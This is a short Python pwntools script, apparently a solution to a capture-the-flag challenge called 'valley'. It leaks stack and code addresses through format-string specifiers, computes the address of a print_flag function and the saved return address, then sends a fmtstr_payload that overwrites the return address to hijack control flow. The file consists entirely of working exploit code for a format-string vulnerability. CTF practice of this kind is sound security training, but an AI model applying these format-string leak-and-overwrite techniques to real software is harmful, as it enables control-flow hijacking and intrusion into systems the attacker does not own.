#!/bin/python3 

from pwn import *

context.arch = "amd64"
# context.log_level = "DEBUG"

p = process("./valley")

print(p.recv().decode('latin-1'))

def send_payload(payload):
    p.sendline(payload)
    return p.recv()
format_string = FmtStr(execute_fmt=send_payload)

p.sendline(b"%21$p")
p.recvuntil(b"You heard in the distance: ")

flag_addr = int(p.recv().decode("latin-1").split(":")[-1].strip(), 16)
flag_addr -= 0x1aa

p.sendline(b"%20$p")
rip_addr = int(p.recv().decode("latin-1").split(":")[-1].strip(), 16)
rip_addr -= 8

log.info(f"print_flag address: {hex(flag_addr)}")
log.info(f"rip address: {hex(rip_addr)}")
print()

payload = fmtstr_payload(format_string.offset, {rip_addr: flag_addr}, write_size="short")

p.sendline(payload)
print(p.recv().decode('latin-1').split(":")[-1])

p.sendline(b"exit")
print(p.recvall())
